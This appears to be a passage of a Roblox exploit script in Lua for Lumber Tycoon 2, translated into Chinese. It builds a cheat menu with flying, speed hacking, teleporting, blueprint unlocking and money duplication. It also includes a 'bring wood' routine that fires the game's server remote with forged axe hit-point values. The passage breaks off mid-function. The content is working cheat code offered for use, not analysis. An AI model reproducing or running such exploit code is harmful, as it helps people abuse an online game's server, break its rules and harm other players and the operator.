local Anim = Instance.new("StringValue")
Anim.Name = "工具"
Anim.Value = "Slash"
Anim.Parent = Sword
end)
Mouse_Icon = "rbxasset://textures/GunCursor.png"
Reloading_Icon = "rbxasset://textures/GunWaitCursor.png"
Tool = Sword
Mouse = nil
function UpdateIcon()
if Mouse then
Mouse.Icon = Tool.Enabled and Mouse_Icon or Reloading_Icon
end
end
function OnEquipped(ToolMouse)
Mouse = ToolMouse
UpdateIcon()
end
function OnChanged(Property)
if Property == "Enabled" then
UpdateIcon()
end
end
Tool.Equipped:Connect(OnEquipped)
Tool.Changed:Connect(OnChanged)
Sword.Parent = game.Players.LocalPlayer.Backpack
end
end)
end)
local creds = window:Tab("伐木大享）",'6035145364')

local tool = creds:section("功能",true)
tool:Button("快捷",function()
        --GUI made by ZeyRoXs#4561 Or ZeyRoxs on YT

--please if 1 option get patched or you have an suggestion,Contact me.



-- Instances:

local DonationMenu = Instance.new("ScreenGui")
local OpenFile = Instance.new("TextButton")
local ScrollingFrame = Instance.new("ScrollingFrame")
local BlueprintBtn = Instance.new("TextButton")
local BringWood = Instance.new("TextButton")
local CloseButton = Instance.new("TextButton")
local Fly = Instance.new("TextButton")
local InstantTP = Instance.new("TextButton")
local MaxLand = Instance.new("TextButton")
local MoneyDupe = Instance.new("TextButton")
local PaintTool = Instance.new("TextButton")
local SpeedHack = Instance.new("TextButton")
local ImageCredits = Instance.new("ImageLabel")
local Credits = Instance.new("TextLabel")
local Lumber = Instance.new("TextLabel")
local V125 = Instance.new("TextLabel")
local Xploit = Instance.new("TextLabel")
local CT = Instance.new("TextButton")

--Properties:

DonationMenu.Name = "DonationMenu"
DonationMenu.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
DonationMenu.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

OpenFile.Name = "OpenFile"
OpenFile.Parent = DonationMenu
OpenFile.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
OpenFile.Position = UDim2.new(0, 0, 0, 323)
OpenFile.Size = UDim2.new(0, 179, 0, 54)
OpenFile.Style = Enum.ButtonStyle.RobloxButton
OpenFile.Font = Enum.Font.GothamBold
OpenFile.Text = "打开LXv1.25"
OpenFile.TextColor3 = Color3.fromRGB(255, 85, 0)
OpenFile.TextSize = 23.000

ScrollingFrame.Parent = DonationMenu
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.BorderColor3 = Color3.fromRGB(255, 85, 0)
ScrollingFrame.BorderSizePixel = 2
ScrollingFrame.Position = UDim2.new(0.180884674, 0, 0.160535112, 0)
ScrollingFrame.Selectable = false
ScrollingFrame.Size = UDim2.new(0, 807, 0, 370)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 1, 0)
ScrollingFrame.ScrollBarThickness = 10

BlueprintBtn.Name = "BlueprintBtn"
BlueprintBtn.Parent = ScrollingFrame
BlueprintBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BlueprintBtn.BorderColor3 = Color3.fromRGB(108, 88, 75)
BlueprintBtn.Position = UDim2.new(0.0439115763, 0, 0.51448524, 0)
BlueprintBtn.Size = UDim2.new(0, 200, 0, 50)
BlueprintBtn.Style = Enum.ButtonStyle.RobloxButton
BlueprintBtn.Font = Enum.Font.SourceSansBold
BlueprintBtn.Text = "获得所有蓝图"
BlueprintBtn.TextColor3 = Color3.fromRGB(255, 85, 0)
BlueprintBtn.TextSize = 25.000
BlueprintBtn.TextStrokeColor3 = Color3.fromRGB(255, 85, 0)

BringWood.Name = "BringWood"
BringWood.Parent = ScrollingFrame
BringWood.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BringWood.BorderColor3 = Color3.fromRGB(108, 88, 75)
BringWood.Position = UDim2.new(0.375730395, 0, 0.330064178, 0)
BringWood.Size = UDim2.new(0, 200, 0, 50)
BringWood.Style = Enum.ButtonStyle.RobloxButton
BringWood.Font = Enum.Font.SourceSansBold
BringWood.Text = "带来木头菜单"
BringWood.TextColor3 = Color3.fromRGB(255, 85, 0)
BringWood.TextSize = 25.000
BringWood.TextStrokeColor3 = Color3.fromRGB(255, 85, 0)

CloseButton.Name = "CloseButton"
CloseButton.Parent = ScrollingFrame
CloseButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
CloseButton.BackgroundTransparency = 1.000
CloseButton.Position = UDim2.new(0.901982009, 0, -0.00158773921, 0)
CloseButton.Size = UDim2.new(0, 80, 0, 65)
CloseButton.Font = Enum.Font.SciFi
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.fromRGB(255, 85, 0)
CloseButton.TextSize = 50.000

Fly.Name = "Fly"
Fly.Parent = ScrollingFrame
Fly.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Fly.BorderColor3 = Color3.fromRGB(108, 88, 75)
Fly.Position = UDim2.new(0.375715524, 0, 0.150840625, 0)
Fly.Size = UDim2.new(0, 200, 0, 50)
Fly.Style = Enum.ButtonStyle.RobloxButton
Fly.Font = Enum.Font.SourceSansBold
Fly.Text = "飞行(F)"
Fly.TextColor3 = Color3.fromRGB(255, 85, 0)
Fly.TextSize = 25.000
Fly.TextStrokeColor3 = Color3.fromRGB(255, 85, 0)

InstantTP.Name = "InstantTP"
InstantTP.Parent = ScrollingFrame
InstantTP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InstantTP.BorderColor3 = Color3.fromRGB(108, 88, 75)
InstantTP.Position = UDim2.new(0.0439698696, 0, 0.330064178, 0)
InstantTP.Size = UDim2.new(0, 200, 0, 50)
InstantTP.Style = Enum.ButtonStyle.RobloxButton
InstantTP.Font = Enum.Font.SourceSansBold
InstantTP.Text = "事例传送GUI"
InstantTP.TextColor3 = Color3.fromRGB(255, 85, 0)
InstantTP.TextSize = 25.000
InstantTP.TextStrokeColor3 = Color3.fromRGB(255, 85, 0)

MaxLand.Name = "MaxLand"
MaxLand.Parent = ScrollingFrame
MaxLand.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MaxLand.BorderColor3 = Color3.fromRGB(108, 88, 75)
MaxLand.Position = UDim2.new(0.687603951, 0, 0.515667796, 0)
MaxLand.Size = UDim2.new(0, 200, 0, 50)
MaxLand.Style = Enum.ButtonStyle.RobloxButton
MaxLand.Font = Enum.Font.SourceSansBold
MaxLand.Text = "满级土地"
MaxLand.TextColor3 = Color3.fromRGB(255, 85, 0)
MaxLand.TextSize = 25.000
MaxLand.TextStrokeColor3 = Color3.fromRGB(255, 85, 0)

MoneyDupe.Name = "MoneyDupe"
MoneyDupe.Parent = ScrollingFrame
MoneyDupe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MoneyDupe.BorderColor3 = Color3.fromRGB(108, 88, 75)
MoneyDupe.Position = UDim2.new(0.687096894, 0, 0.330064237, 0)
MoneyDupe.Size = UDim2.new(0, 200, 0, 50)
MoneyDupe.Style = Enum.ButtonStyle.RobloxButton
MoneyDupe.Font = Enum.Font.SourceSansBold
MoneyDupe.Text = "复制金钱GUI"
MoneyDupe.TextColor3 = Color3.fromRGB(255, 85, 0)
MoneyDupe.TextSize = 25.000
MoneyDupe.TextStrokeColor3 = Color3.fromRGB(255, 85, 0)

PaintTool.Name = "PaintTool"
PaintTool.Parent = ScrollingFrame
PaintTool.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PaintTool.BorderColor3 = Color3.fromRGB(108, 88, 75)
PaintTool.Position = UDim2.new(0.376223475, 0, 0.515667796, 0)
PaintTool.Size = UDim2.new(0, 200, 0, 50)
PaintTool.Style = Enum.ButtonStyle.RobloxButton
PaintTool.Font = Enum.Font.SourceSansBold
PaintTool.Text = "油漆工具"
PaintTool.TextColor3 = Color3.fromRGB(255, 85, 0)
PaintTool.TextSize = 25.000
PaintTool.TextStrokeColor3 = Color3.fromRGB(255, 85, 0)

SpeedHack.Name = "SpeedHack"
SpeedHack.Parent = ScrollingFrame
SpeedHack.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SpeedHack.BorderColor3 = Color3.fromRGB(108, 88, 75)
SpeedHack.Position = UDim2.new(0.0440410823, 0, 0.148196682, 0)
SpeedHack.Size = UDim2.new(0, 200, 0, 50)
SpeedHack.Style = Enum.ButtonStyle.RobloxButton
SpeedHack.Font = Enum.Font.SourceSansBold
SpeedHack.Text = "速攻 (X)"
SpeedHack.TextColor3 = Color3.fromRGB(255, 85, 0)
SpeedHack.TextSize = 25.000
SpeedHack.TextStrokeColor3 = Color3.fromRGB(255, 85, 0)

ImageCredits.Name = "ImageCredits"
ImageCredits.Parent = ScrollingFrame
ImageCredits.Active = true
ImageCredits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageCredits.Position = UDim2.new(0.461544782, 0, 0.835585594, 0)
ImageCredits.Selectable = true
ImageCredits.Size = UDim2.new(0, 97, 0, 72)
ImageCredits.Image = "http://www.roblox.com/asset/?id=4844322888"

Credits.Name = "Credits"
Credits.Parent = ScrollingFrame
Credits.Active = true
Credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Credits.BackgroundTransparency = 1.000
Credits.Position = UDim2.new(-0.0137394946, 0, 0.837035954, 0)
Credits.Selectable = true
Credits.Size = UDim2.new(0, 829, 0, 67)
Credits.Font = Enum.Font.SciFi
Credits.Text = "汉化作者是繁星"
Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
Credits.TextSize = 20.000

Lumber.Name = "Lumber"
Lumber.Parent = ScrollingFrame
Lumber.Active = true
Lumber.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Lumber.BackgroundTransparency = 1.000
Lumber.Position = UDim2.new(-0.0629111826, 0, 0.0156341009, 0)
Lumber.Selectable = true
Lumber.Size = UDim2.new(0, 538, 0, 50)
Lumber.Font = Enum.Font.SciFi
Lumber.Text = "木材"
Lumber.TextColor3 = Color3.fromRGB(108, 88, 75)
Lumber.TextSize = 100.000

V125.Name = "V 1.25"
V125.Parent = ScrollingFrame
V125.Active = true
V125.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
V125.BackgroundTransparency = 1.000
V125.Position = UDim2.new(0.656309545, 0, 0.0444141142, 0)
V125.Selectable = true
V125.Size = UDim2.new(0, 172, 0, 33)
V125.Font = Enum.Font.GothamBlack
V125.Text = "V 1.25"
V125.TextColor3 = Color3.fromRGB(255, 255, 255)
V125.TextSize = 20.000

Xploit.Name = "Xploit"
Xploit.Parent = ScrollingFrame
Xploit.Active = true
Xploit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Xploit.BackgroundTransparency = 1.000
Xploit.Position = UDim2.new(0.25728029, 0, 0.0150521044, 0)
Xploit.Selectable = true
Xploit.Size = UDim2.new(0, 538, 0, 50)
Xploit.Font = Enum.Font.SciFi
Xploit.Text = "Xploit"
Xploit.TextColor3 = Color3.fromRGB(255, 85, 0)
Xploit.TextSize = 100.000

CT.Name = "CT"
CT.Parent = ScrollingFrame
CT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CT.BorderColor3 = Color3.fromRGB(108, 88, 75)
CT.Position = UDim2.new(0.68883431, 0, 0.147496149, 0)
CT.Size = UDim2.new(0, 200, 0, 50)
CT.Style = Enum.ButtonStyle.RobloxButton
CT.Font = Enum.Font.SourceSansBold
CT.Text = "CTRL单击传送"
CT.TextColor3 = Color3.fromRGB(255, 85, 0)
CT.TextSize = 25.000
CT.TextStrokeColor3 = Color3.fromRGB(255, 85, 0)

-- Scripts:

local function IWWKLLB_fake_script() -- OpenFile.ScriptOpen 
	local script = Instance.new('LocalScript', OpenFile)

	local frame = script.Parent.Parent.ScrollingFrame
	
	local open = true
	
	
	
	
	
	script.Parent.MouseButton1Click:Connect(function()
	
	 if frame.Visible == false then
	
	  frame.Visible = true
	
	 else
	
	  frame.Visible = false
	
	 end
	
	end)
	
end
coroutine.wrap(IWWKLLB_fake_script)()
local function DUBBMWU_fake_script() -- BlueprintBtn.Script 
	local script = Instance.new('Script', BlueprintBtn)

	BlueprintBtn.MouseButton1Down:connect(function() 
		for i,v in pairs(game.ReplicatedStorage.Purchasables.Structures.BlueprintStructures:GetChildren()) do
	local clone = v:Clone()
	clone.Parent = game.Players.LocalPlayer.PlayerBlueprints.Blueprints
	end
	end)
end
coroutine.wrap(DUBBMWU_fake_script)()
local function KHUENF_fake_script() -- BringWood.Script 
	local script = Instance.new('Script', BringWood)

	BringWood.MouseButton1Down:connect(function() 
	-- Gui to Lua
	-- Version: 3.2
	
	-- Instances:
	
	local EviBringWoodGui = Instance.new("ScreenGui")
	local EvGornjeBringW = Instance.new("Frame")
	local BringWoodFrame = Instance.new("ScrollingFrame")
	local GoldSwampy = Instance.new("TextButton")
	local GreenSwampy = Instance.new("TextButton")
	local CaveCrawler = Instance.new("TextButton")
	local Frost = Instance.new("TextButton")
	local Koa = Instance.new("TextButton")
	local Oak = Instance.new("TextButton")
	local Volcano = Instance.new("TextButton")
	local SnowGlow = Instance.new("TextButton")
	local Walnut = Instance.new("TextButton")
	local Birch = Instance.new("TextButton")
	local Generic = Instance.new("TextButton")
	local Cherry = Instance.new("TextButton")
	local Fir = Instance.new("TextButton")
	local Pine = Instance.new("TextButton")
	local Sinister = Instance.new("TextButton")
	local Spooky = Instance.new("TextButton")
	local Palm = Instance.new("TextButton")
	local QuantityTree = Instance.new("TextBox")
	local TreeammountLabel = Instance.new("TextLabel")
	local BWoodX = Instance.new("TextButton")
	local BringWoodEviLabel = Instance.new("TextLabel")
	
	--Properties:
	
	EviBringWoodGui.Name = "EviBringWoodGui"
	EviBringWoodGui.Parent = game.CoreGui
	EviBringWoodGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	
	EvGornjeBringW.Name = "EvGornjeBringW"
	EvGornjeBringW.Parent = EviBringWoodGui
	EvGornjeBringW.BackgroundColor3 = Color3.fromRGB(207, 207, 207)
	EvGornjeBringW.BorderSizePixel = 0
	EvGornjeBringW.Position = UDim2.new(0.870398819, 0, 0.370177269, 0)
	EvGornjeBringW.Size = UDim2.new(0, 169, 0, 604)
	EvGornjeBringW.Active = true
	EvGornjeBringW.Draggable = true
	
	BringWoodFrame.Name = "BringWoodFrame"
	BringWoodFrame.Parent = EvGornjeBringW
	BringWoodFrame.BackgroundColor3 = Color3.fromRGB(207, 207, 207)
	BringWoodFrame.BorderColor3 = Color3.fromRGB(168, 168, 168)
	BringWoodFrame.BorderSizePixel = 0
	BringWoodFrame.Position = UDim2.new(3.17751479, -535, 0.11092715, -20)
	BringWoodFrame.Size = UDim2.new(0, 168, 0, 557)
	
	GoldSwampy.Name = "GoldSwampy"
	GoldSwampy.Parent = BringWoodFrame
	GoldSwampy.BackgroundColor3 = Color3.fromRGB(221, 221, 221)
	GoldSwampy.BorderSizePixel = 0
	GoldSwampy.Position = UDim2.new(0.0399056971, 0, 0.404132009, 0)
	GoldSwampy.Size = UDim2.new(0, 148, 0, 19)
	GoldSwampy.Font = Enum.Font.SourceSansBold
	GoldSwampy.Text = "金沼泽"
	GoldSwampy.TextColor3 = Color3.fromRGB(62, 62, 62)
	GoldSwampy.TextSize = 27.000
	
	GreenSwampy.Name = "GreenSwampy"
	GreenSwampy.Parent = BringWoodFrame
	GreenSwampy.BackgroundColor3 = Color3.fromRGB(221, 221, 221)
	GreenSwampy.BorderSizePixel = 0
	GreenSwampy.Position = UDim2.new(0.0399056971, 0, 0.354230195, 0)
	GreenSwampy.Size = UDim2.new(0, 148, 0, 19)
	GreenSwampy.Font = Enum.Font.SourceSansBold
	GreenSwampy.Text = "绿沼泽"
	GreenSwampy.TextColor3 = Color3.fromRGB(62, 62, 62)
	GreenSwampy.TextSize = 27.000
	
	CaveCrawler.Name = "CaveCrawler"
	CaveCrawler.Parent = BringWoodFrame
	CaveCrawler.BackgroundColor3 = Color3.fromRGB(221, 221, 221)
	CaveCrawler.BorderSizePixel = 0
	CaveCrawler.Position = UDim2.new(0.0399056971, 0, 0.0317074582, 0)
	CaveCrawler.Size = UDim2.new(0, 148, 0, 19)
	CaveCrawler.Font = Enum.Font.SourceSansBold
	CaveCrawler.Text = "洞穴爬行者"
	CaveCrawler.TextColor3 = Color3.fromRGB(62, 62, 62)
	CaveCrawler.TextSize = 27.000
	
	Frost.Name = "Frost"
	Frost.Parent = BringWoodFrame
	Frost.BackgroundColor3 = Color3.fromRGB(221, 221, 221)
	Frost.BorderSizePixel = 0
	Frost.Position = UDim2.new(0.0399056971, 0, 0.100881435, 0)
	Frost.Size = UDim2.new(0, 148, 0, 19)
	Frost.Font = Enum.Font.SourceSansBold
	Frost.Text = "霜"
	Frost.TextColor3 = Color3.fromRGB(62, 62, 62)
	Frost.TextSize = 27.000
	
	Koa.Name = "Koa"
	Koa.Parent = BringWoodFrame
	Koa.BackgroundColor3 = Color3.fromRGB(221, 221, 221)
	Koa.BorderSizePixel = 0
	Koa.Position = UDim2.new(0.0399056971, 0, 0.123886056, 0)
	Koa.Size = UDim2.new(0, 148, 0, 19)
	Koa.Font = Enum.Font.SourceSansBold
	Koa.Text = "所以"
	Koa.TextColor3 = Color3.fromRGB(62, 62, 62)
	Koa.TextSize = 27.000
	
	Oak.Name = "Oak"
	Oak.Parent = BringWoodFrame
	Oak.BackgroundColor3 = Color3.fromRGB(221, 221, 221)
	Oak.BorderSizePixel = 0
	Oak.Position = UDim2.new(0.0399056971, 0, 0.14677906, 0)
	Oak.Size = UDim2.new(0, 148, 0, 19)
	Oak.Font = Enum.Font.SourceSansBold
	Oak.Text = "木材"
	Oak.TextColor3 = Color3.fromRGB(62, 62, 62)
	Oak.TextSize = 27.000
	
	Volcano.Name = "Volcano"
	Volcano.Parent = BringWoodFrame
	Volcano.BackgroundColor3 = Color3.fromRGB(221, 221, 221)
	Volcano.BorderSizePixel = 0
	Volcano.Position = UDim2.new(0.0399056971, 0, 0.0781188309, 0)
	Volcano.Size = UDim2.new(0, 148, 0, 19)
	Volcano.Font = Enum.Font.SourceSansBold
	Volcano.Text = "火山"
	Volcano.TextColor3 = Color3.fromRGB(62, 62, 62)
	Volcano.TextSize = 27.000
	
	SnowGlow.Name = "SnowGlow"
	SnowGlow.Parent = BringWoodFrame
	SnowGlow.BackgroundColor3 = Color3.fromRGB(221, 221, 221)
	SnowGlow.BorderSizePixel = 0
	SnowGlow.Position = UDim2.new(0.0399056971, 0, 0.0545145124, 0)
	SnowGlow.Size = UDim2.new(0, 148, 0, 19)
	SnowGlow.Font = Enum.Font.SourceSansBold
	SnowGlow.Text = "雪辉"
	SnowGlow.TextColor3 = Color3.fromRGB(62, 62, 62)
	SnowGlow.TextSize = 27.000
	
	Walnut.Name = "Walnut"
	Walnut.Parent = BringWoodFrame
	Walnut.BackgroundColor3 = Color3.fromRGB(221, 221, 221)
	Walnut.BorderSizePixel = 0
	Walnut.Position = UDim2.new(0.0399057008, 0, 0.215171024, 0)
	Walnut.Size = UDim2.new(0, 148, 0, 19)
	Walnut.Font = Enum.Font.SourceSansBold
	Walnut.Text = "核桃"
	Walnut.TextColor3 = Color3.fromRGB(62, 62, 62)
	Walnut.TextSize = 27.000
	
	Birch.Name = "Birch"
	Birch.Parent = BringWoodFrame
	Birch.BackgroundColor3 = Color3.fromRGB(221, 221, 221)
	Birch.BorderSizePixel = 0
	Birch.Position = UDim2.new(0.0399057046, 0, 0.379081249, 0)
	Birch.Size = UDim2.new(0, 148, 0, 19)
	Birch.Font = Enum.Font.SourceSansBold
	Birch.Text = "桦木"
	Birch.TextColor3 = Color3.fromRGB(62, 62, 62)
	Birch.TextSize = 27.000
	
	Generic.Name = "Generic"
	Generic.Parent = BringWoodFrame
	Generic.BackgroundColor3 = Color3.fromRGB(221, 221, 221)
	Generic.BorderSizePixel = 0
	Generic.Position = UDim2.new(0.0399056971, 0, 0.235932171, 0)
	Generic.Size = UDim2.new(0, 148, 0, 19)
	Generic.Font = Enum.Font.SourceSansBold
	Generic.Text = "通用的"
	Generic.TextColor3 = Color3.fromRGB(62, 62, 62)
	Generic.TextSize = 27.000
	
	Cherry.Name = "Cherry"
	Cherry.Parent = BringWoodFrame
	Cherry.BackgroundColor3 = Color3.fromRGB(221, 221, 221)
	Cherry.BorderSizePixel = 0
	Cherry.Position = UDim2.new(0.0399056971, 0, 0.172569692, 0)
	Cherry.Size = UDim2.new(0, 148, 0, 19)
	Cherry.Font = Enum.Font.SourceSansBold
	Cherry.Text = "樱桃"
	Cherry.TextColor3 = Color3.fromRGB(62, 62, 62)
	Cherry.TextSize = 27.000
	
	Fir.Name = "Fir"
	Fir.Parent = BringWoodFrame
	Fir.BackgroundColor3 = Color3.fromRGB(221, 221, 221)
	Fir.BorderSizePixel = 0
	Fir.Position = UDim2.new(0.0399056897, 0, 0.283199161, 0)
	Fir.Size = UDim2.new(0, 148, 0, 19)
	Fir.Font = Enum.Font.SourceSansBold
	Fir.Text = "为了"
	Fir.TextColor3 = Color3.fromRGB(62, 62, 62)
	Fir.TextSize = 27.000
	
	Pine.Name = "Pine"
	Pine.Parent = BringWoodFrame
	Pine.BackgroundColor3 = Color3.fromRGB(221, 221, 221)
	Pine.BorderSizePixel = 0
	Pine.Position = UDim2.new(0.0399056897, 0, 0.194305629, 0)
	Pine.Size = UDim2.new(0, 148, 0, 19)
	Pine.Font = Enum.Font.SourceSansBold
	Pine.Text = "松树"
	Pine.TextColor3 = Color3.fromRGB(62, 62, 62)
	Pine.TextSize = 27.000
	
	Sinister.Name = "Sinister"
	Sinister.Parent = BringWoodFrame
	Sinister.BackgroundColor3 = Color3.fromRGB(221, 221, 221)
	Sinister.BorderSizePixel = 0
	Sinister.Position = UDim2.new(0.0399056897, 0, 0.329738885, 0)
	Sinister.Size = UDim2.new(0, 148, 0, 19)
	Sinister.Font = Enum.Font.SourceSansBold
	Sinister.Text = "险恶"
	Sinister.TextColor3 = Color3.fromRGB(62, 62, 62)
	Sinister.TextSize = 27.000
	
	Spooky.Name = "Spooky"
	Spooky.Parent = BringWoodFrame
	Spooky.BackgroundColor3 = Color3.fromRGB(221, 221, 221)
	Spooky.BorderSizePixel = 0
	Spooky.Position = UDim2.new(0.0399056897, 0, 0.30696103, 0)
	Spooky.Size = UDim2.new(0, 148, 0, 19)
	Spooky.Font = Enum.Font.SourceSansBold
	Spooky.Text = "幽灵般的"
	Spooky.TextColor3 = Color3.fromRGB(62, 62, 62)
	Spooky.TextSize = 27.000
	
	Palm.Name = "Palm"
	Palm.Parent = BringWoodFrame
	Palm.BackgroundColor3 = Color3.fromRGB(221, 221, 221)
	Palm.BorderSizePixel = 0
	Palm.Position = UDim2.new(0.0399056934, 0, 0.25868246, 0)
	Palm.Size = UDim2.new(0, 148, 0, 19)
	Palm.Font = Enum.Font.SourceSansBold
	Palm.Text = "棕榈"
	Palm.TextColor3 = Color3.fromRGB(62, 62, 62)
	Palm.TextSize = 27.000
	
	QuantityTree.Name = "QuantityTree"
	QuantityTree.Parent = BringWoodFrame
	QuantityTree.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	QuantityTree.BorderSizePixel = 0
	QuantityTree.Position = UDim2.new(0.77976191, 0, 0, 0)
	QuantityTree.Size = UDim2.new(0, 23, 0, 27)
	QuantityTree.Font = Enum.Font.SourceSansBold
	QuantityTree.Text = "3"
	QuantityTree.TextColor3 = Color3.fromRGB(0, 0, 0)
	QuantityTree.TextSize = 14.000
	
	TreeammountLabel.Name = "TreeammountLabel"
	TreeammountLabel.Parent = BringWoodFrame
	TreeammountLabel.BackgroundColor3 = Color3.fromRGB(221, 221, 221)
	TreeammountLabel.BorderSizePixel = 0
	TreeammountLabel.Position = UDim2.new(0.0357142873, 0, 0.00646863412, 0)
	TreeammountLabel.Size = UDim2.new(0, 117, 0, 19)
	TreeammountLabel.Font = Enum.Font.SourceSansBold
	TreeammountLabel.Text = "树木数量"
	TreeammountLabel.TextColor3 = Color3.fromRGB(62, 62, 62)
	TreeammountLabel.TextScaled = true
	TreeammountLabel.TextSize = 27.000
	TreeammountLabel.TextWrapped = true
	
	BWoodX.Name = "BWoodX"
	BWoodX.Parent = EvGornjeBringW
	BWoodX.BackgroundColor3 = Color3.fromRGB(255, 30, 30)
	BWoodX.BackgroundTransparency = 1.000
	BWoodX.Position = UDim2.new(0.839568019, 0, -0.000626152614, 0)
	BWoodX.Size = UDim2.new(0, 29, 0, 28)
	BWoodX.Font = Enum.Font.SourceSans
	BWoodX.Text = "X"
	BWoodX.TextColor3 = Color3.fromRGB(213, 15, 15)
	BWoodX.TextScaled = true
	BWoodX.TextSize = 14.000
	BWoodX.TextWrapped = true
	
	BringWoodEviLabel.Name = "BringWoodEviLabel"
	BringWoodEviLabel.Parent = EvGornjeBringW
	BringWoodEviLabel.BackgroundColor3 = Color3.fromRGB(207, 207, 207)
	BringWoodEviLabel.BorderSizePixel = 0
	BringWoodEviLabel.Size = UDim2.new(0, 142, 0, 47)
	BringWoodEviLabel.Font = Enum.Font.Cartoon
	BringWoodEviLabel.Text = "由繁星汉化"
	BringWoodEviLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
	BringWoodEviLabel.TextScaled = true
	BringWoodEviLabel.TextSize = 14.000
	BringWoodEviLabel.TextWrapped = true
	
	function Teleport(XP,YP,ZP)
	-- Config How Many Blocks It Will Tp You Untill The Final Destination:
	local XTpEvery = 15
	local YTpEvery = 15
	local ZTpEvery = 15
	--Time to Tp Every:
	local Timer = 0.001
	local pos = game:GetService('Players').LocalPlayer.Character.HumanoidRootPart
	if pos.Position.X < XP then
	for x = pos.Position.X,XP,XTpEvery do
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(x,pos.Position.Y,pos.Position.Z))
	local part = Instance.new("Part", workspace)
	part.Anchored = true
	part.Size = Vector3.new(10,0.1,10)
	part.Material = "Glass"
	part.BrickColor = BrickColor.Random()
	part.Transparency = 0.7
	part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
	wait(Timer)
	part.Destroy(part)
	end
	else
	for x = pos.Position.X,XP,-XTpEvery do
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(x,pos.Position.Y,pos.Position.Z))
	local part = Instance.new("Part", workspace)
	part.Anchored = true
	part.Size = Vector3.new(10,0.1,10)
	part.Material = "Glass"
	part.BrickColor = BrickColor.Random()
	part.Transparency = 0.7
	part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
	wait(Timer)
	part.Destroy(part)
	end
	end
	if pos.Position.Z < ZP then
	for z = pos.Position.Z,ZP,ZTpEvery do
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X,pos.Position.Y,z))
	local part = Instance.new("Part", workspace)
	part.Anchored = true
	part.Size = Vector3.new(10,0.1,10)
	part.Material = "Glass"
	part.BrickColor = BrickColor.Random()
	part.Transparency = 0.7
	part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
	wait(Timer)
	part.Destroy(part)
	end
	else
	for z = pos.Position.Z,ZP,-ZTpEvery do
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X,pos.Position.Y,z))
	local part = Instance.new("Part", workspace)
	part.Anchored = true
	part.Size = Vector3.new(10,0.1,10)
	part.Material = "Glass"
	part.BrickColor = BrickColor.Random()
	part.Transparency = 0.7
	part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
	wait(Timer)
	part.Destroy(part)
	end
	end
	if pos.Position.Y < YP then
	for High = pos.Position.Y,YP,YTpEvery do
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X ,High ,pos.Position.Z))
	local part = Instance.new("Part", workspace)
	part.Anchored = true
	part.Size = Vector3.new(10,0.1,10)
	part.Material = "Glass"
	part.BrickColor = BrickColor.Random()
	part.Transparency = 0.7
	part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
	wait(Timer)
	part.Destroy(part)
	end
	else
	for High = pos.Position.Y,YP,-YTpEvery do
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X ,High ,pos.Position.Z))
	local part = Instance.new("Part", workspace)
	part.Anchored = true
	part.Size = Vector3.new(10,0.1,10)
	part.Material = "Glass"
	part.BrickColor = BrickColor.Random()
	part.Transparency = 0.7
	part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
	wait(Timer)
	part.Destroy(part)
	end
	end
	game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(XP + 5,YP,ZP + 5)
	end
	
	function GetTree(Wood, PlayerName, Quantitys)
	local Counter = 0
	local HitPoints={
	['Beesaxe']= 1.4;
	['AxeAmber']= 3.39;
	['ManyAxe']= 10.2;
	['BasicHatchet']= 0.2;
	['Axe1']= 0.55;
	['Axe2']= 0.93;
	['AxeAlphaTesters']= 1.5;
	['Rukiryaxe']= 1.68;
	['Axe3']= 1.45;
	['AxeBetaTesters']= 1.45;
	['FireAxe']= 0.6;
	['SilverAxe']= 1.6;
	['EndTimesAxe']= 1.58;
	['AxeChicken']= 0.9;
	['CandyCaneAxe']= 0;
	['AxeTwitter']= 1.65
	}
	function axe(Val)
	local A_1 = Val.CutEvent
	local A_2 = 
	{
		["tool"] = game.Players.LocalPlayer.Character:FindFirstChild("Tool"), 
		["faceVector"] = Vector3.new(0, 0, -1), 
		["height"] = 0.3, 
		["sectionId"] = 1, 
		["hitPoints"] = HitPoints[game.Players.LocalPlayer.Character:FindFirstChild("Tool").ToolName.Value], 
		["cooldown"] = 0.112, 
		["cuttingClass"] = "Axe"
	}
	local Event = game:GetService("ReplicatedStorage").Interaction.RemoteProxy
	Event:FireServer(A_1, A_2)
	end
